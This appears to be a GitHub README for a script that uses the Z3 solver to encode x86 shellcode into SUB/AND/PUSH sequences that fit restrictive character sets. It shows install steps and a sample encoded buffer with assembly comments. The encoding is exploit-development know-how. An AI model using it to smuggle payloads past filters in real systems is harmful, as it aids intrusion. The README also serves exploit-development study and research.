# Z3 SUB Shellcode Encoder

A _relatively_ simple script for encoding shellcode as described [here](https://marcosvalle.github.io/re/exploit/2018/10/05/sub-encoding.html), [here](https://vellosec.net/blog/exploit-dev/carving-shellcode-using-restrictive-character-sets/) and [here](https://github.com/marcosValle/z3ncoder). Uses the `z3` theorem solver to determine values to subtract.

# Install

```
$ git clone https://github.com/dpindur/z3-sub-shellcode-encoder
$ cd z3-sub-encoder
$ pip install -r requirements.txt
```

# Usage

```
$ python encode.py
buf  = b''
buf += b'\x2d\x6e\x62\x37\x7e'              # sub  eax, 0x7e37626e
buf += b'\x2d\x01\x07\x32\x74'              # sub  eax, 0x74320701
buf += b'\x2d\x01\x06\x06\x7d'              # sub  eax, 0x7d060601
buf += b'\x50'                              # push eax
buf += b'\x25\x65\x46\x66\x69'              # and  eax, 0x69664665
buf += b'\x25\x08\x66\x6d\x6e'              # and  eax, 0x6e6d6608

buf += b'\x2d\x36\x7a\x09\x07'              # sub  eax, 0x07097a36
buf += b'\x2d\x39\x76\x06\x5f'              # sub  eax, 0x5f067639
buf += b'\x2d\x01\x7f\x5f\x09'              # sub  eax, 0x095f7f01
buf += b'\x50'                              # push eax
buf += b'\x25\x3c\x6e\x66\x6f'              # and  eax, 0x6f666e3c
buf += b'\x25\x02\x4a\x6d\x69'              # and  eax, 0x696d4a02

buf += b'\x2d\x32\x39\x05\x7e'              # sub  eax, 0x7e053932
buf += b'\x2d\x06\x32\x63\x77'              # sub  eax, 0x77633206
buf += b'\x2d\x38\x04\x07\x7a'              # sub  eax, 0x7a070438
buf += b'\x50'                              # push eax
buf += b'\x25\x79\x72\x7b\x43'              # and  eax, 0x437b7279
buf += b'\x25\x63\x6c\x6a\x69'              # and  eax, 0x696a6c63

buf += b'\x2d\x36\x7a\x6a\x5f'              # sub  eax, 0x5f6a7a36
buf += b'\x2d\x31\x76\x01\x07'              # sub  eax, 0x07017631
buf += b'\x2d\x09\x7f\x03\x09'              # sub  eax, 0x09037f09
buf += b'\x50'                              # push eax
buf += b'\x25\x65\x46\x66\x69'              # and  eax, 0x69664665
buf += b'\x25\x08\x66\x6d\x69'              # and  eax, 0x696d6608
```